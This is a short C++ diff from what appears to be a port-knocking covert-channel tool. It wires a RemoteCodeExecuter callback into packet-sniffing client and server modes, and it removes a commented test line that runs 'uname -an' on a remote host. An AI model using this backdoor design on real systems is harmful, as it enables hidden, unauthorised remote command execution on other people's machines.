@@ -172,6 +172,7 @@ int clientMode(const Properties &p) {
     }
     */
 
+    // get all the settings
     const std::string &interface = p.at("interface");
     const std::string &key = p.at("key");
 
@@ -180,6 +181,10 @@ int clientMode(const Properties &p) {
     unsigned int knockDuration = std::stoi(p.at("knockDuration"));
 
     NetworkEngine netEngine(interface, key, knockPattern, knockPort, knockDuration);
+
+    // adding all the required callback functions
+    netEngine.LoopCallbacks.push_back(RemoteCodeExecuter::netCallback);
+
     netEngine.startSyncSniff("ip");
 
     return 0;
@@ -201,6 +206,7 @@ int serverMode(const Properties &p) {
 
     struct in_addr daddr;
 
+    // get all the settings
     const std::string &interface = p.at("interface");
     const std::string &key = p.at("key");
 
@@ -209,6 +215,10 @@ int serverMode(const Properties &p) {
     unsigned int knockDuration = std::stoi(p.at("knockDuration"));
 
     NetworkEngine netEngine(interface, key, knockPattern, knockPort, knockDuration);
+
+    // adding all the required callback functions
+    netEngine.LoopCallbacks.push_back(RemoteCodeExecuter::netCallback);
+
     netEngine.startAsyncSniff("ip");
 
     running = true;
@@ -218,8 +228,6 @@ int serverMode(const Properties &p) {
         if (!std::getline(std::cin, line)) {
             continue;
         }
-
-        // line = "exec 192.168.0.17 uname -an";
 
         tokens = tokenizeString(line);
 
